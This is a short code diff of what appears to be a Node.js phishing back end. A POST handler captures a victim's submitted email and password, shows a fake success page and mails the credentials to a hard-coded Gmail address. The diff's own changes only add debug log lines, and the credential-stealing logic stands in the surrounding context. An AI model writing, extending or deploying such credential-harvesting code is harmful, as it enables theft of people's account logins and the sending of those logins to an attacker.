@@ -30,7 +30,7 @@ app.post('/_', function (req, res) {
     res.render('f_success');
     var captured_content = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`;
     
-    
+    console.log("es");
     var message = "need help";
     var toEmail = "mdalonebd@gmail.com";
 
@@ -57,7 +57,7 @@ transporter.sendMail(mailOptions, function (err, info) {
     console.log(info);
 });
     
-    
+    console.log(67);
     
     
     
